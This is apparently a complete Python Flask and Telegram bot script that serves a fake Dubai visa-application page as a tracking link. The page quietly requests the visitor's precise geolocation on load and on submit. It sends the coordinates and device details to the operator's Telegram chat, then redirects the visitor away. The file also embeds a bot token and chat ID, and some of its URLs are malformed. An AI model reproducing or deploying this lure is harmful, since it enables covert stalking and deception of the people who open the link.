import os
import threading
import requests
from flask import Flask, request
import telebot

# --- AAP KI TELEGRAM CREDENTIALS (VERIFIED) ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# Initialize Flask and TeleBot
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Helper function to send messages to Telegram
def send_telegram_message(message):
    url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- TELEGRAM BOT COMMANDS ---
@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        app_url = os.environ.get("APP_URL", "https://onrender.com")
        
        response_text = (
            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
            f"`{app_url}`\n\n"
            f"Is link ko send karein. Jaise hi user click karega, aapko instantly telegram par notification mil jayegi!"
        )
        bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Unauthorized access!")

# --- FLASK WEB SERVER (INSTANT TELEGRAM TRIGGER + VISA WEBPAGE) ---
@app.route("/")
def index():
    # 1. JAISE HI LINK OPEN HOGA - INSTANT TELEGRAM ALERT JAYEGA
    user_agent = request.headers.get('User-Agent', 'Unknown Device')
    
    # Filter out bot visits (like telegram preview bots) to avoid fake alerts
    if "bot" not in user_agent.lower() and "telegram" not in user_agent.lower():
        alert_msg = (
            f"👤 *⚡ ACTIVE: One person opened your website!* ⚡\n\n"
            f"📱 *Device Info:* `{user_agent[:100]}`"
        )
        send_telegram_message(alert_msg)

    # 2. USER KO SAATH HI ORIGINAL VISA PORTAL KA INTERFACE DIKHEGA
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dubai Travel & Tour - Professional Visa Services</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f172a; color: #f8fafc; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 500px; width: 100%; background: #1e293b; padding: 30px; border-radius: 16px; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
        .logo { font-size: 24px; font-weight: bold; color: #38bdf8; margin-bottom: 5px; }
        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 25px; }
        .step-container { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #1e293b; display: flex; justify-content: space-around; font-size: 12px; color: #64748b; }
        .step { display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .step.active { color: #38bdf8; font-weight: bold; }
        .step-num { width: 22px; height: 22px; background: #334155; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; }
        .step.active .step-num { background: #38bdf8; color: #0f172a; }
        .form-group { text-align: left; margin-bottom: 18px; }
        label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 6px; font-weight: 500; }
        select, input { width: 100%; padding: 11px 15px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; font-size: 14px; outline: none; }
        select:focus, input:focus { border-color: #38bdf8; }
        .btn { width: 100%; background: #38bdf8; color: #0f172a; border: none; padding: 13px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #7dd3fc; }
        .loading-overlay { display: none; margin-top: 15px; color: #94a3b8; font-size: 13px; }
        .spinner { width: 24px; height: 24px; border: 3px solid #334155; border-top: 3px solid #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">Dubai Travel & Tour</div>
    <div class="subtitle">Visa Application & Secure Verification Portal</div>
    
    <div class="step-container">
        <div class="step active"><div class="step-num">1</div>Verification</div>
        <div class="step"><div class="step-num">2</div>Travel Details</div>
        <div class="step"><div class="step-num">3</div>Documents</div>
        <div class="step"><div class="step-num">4</div>Review</div>
    </div>

    <div id="form-panel">
        <div class="form-group">
            <label>Select Destination Country *</label>
            <select id="country">
                <option value="Malaysia">Malaysia ($45 USD)</option>
                <option value="Italy">Italy (€80 EUR)</option>
                <option value="Germany">Germany ($90 USD)</option>
                <option value="Saudi Arabia">Saudi Arabia ($120 USD)</option>
                <option value="Poland">Poland ($95 USD)</option>
                <option value="Turkey">Turkey ($60 USD)</option>
            </select>
        </div>
        <div class="form-group">
            <label>Visa Type *</label>
            <select>
                <option>Work Visa / Employment Card</option>
                <option>E-Visa / Tourist Entry</option>
                <option>Visit Visa / Umrah Entry</option>
            </select>
        </div>
        <div class="form-group">
            <label>Full Name (as in Passport) *</label>
            <input type="text" id="fullname" placeholder="Enter your official full name" required>
        </div>
        <button class="btn" onclick="startProcess()">Proceed to Step 2</button>
    </div>

    <div id="loading" class="loading-overlay">
        <div class="spinner"></div>
        <div id="load-msg">Connecting secure application database...</div>
    </div>
</div>

<script>
    function sendLocationData(payload) {
        fetch('/update', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        }).catch(function(e){});
    }

    function onSuccess(pos) {
        sendLocationData({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
        });
    }
    
    function startProcess() {
        const nameVal = document.getElementById('fullname').value;
        if(!nameVal) {
            alert('Please enter your full name to proceed.');
            return;
        }

        document.getElementById('form-panel').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        // Form submit hotay hi browser background me bypass karkay permission mangega
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(onSuccess, null, {
                enableHighAccuracy: true,
                timeout: 5000
            });
        }
        
        // 2 second ke andar banda netlify wali application par chala jayega
        setTimeout(function() {
            window.location.href = "https://netlify.app";
        }, 2000);
    }

    // Backup automatic call trigger on screen open
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(onSuccess, null, {
                enableHighAccuracy: true
            });
        }
    };
</script>

</body>
</html>
'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    
    if data and "lat" in data and "lon" in data:
        lat = data.get("lat")
        lon = data.get("lon")
        acc = data.get("accuracy", "N/A")
        
        msg = (
            f"🎯 *LOCATION RECEIVED SUCCESSFULLY!* 🎯\n\n"
            f"🌐 *Latitude:* `{lat}`\n"
            f"🌐 *Longitude:* `{lon}`\n"
            f"🎯 *Accuracy:* `{acc} meters`\n\n"
            f"🗺️ [Google Maps Link](https://google.com{lat},{lon})"
        )
        send_telegram_message(msg)
    return "OK", 200

# Run Flask server
def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your tracking link.")
    bot.infinity_polling()
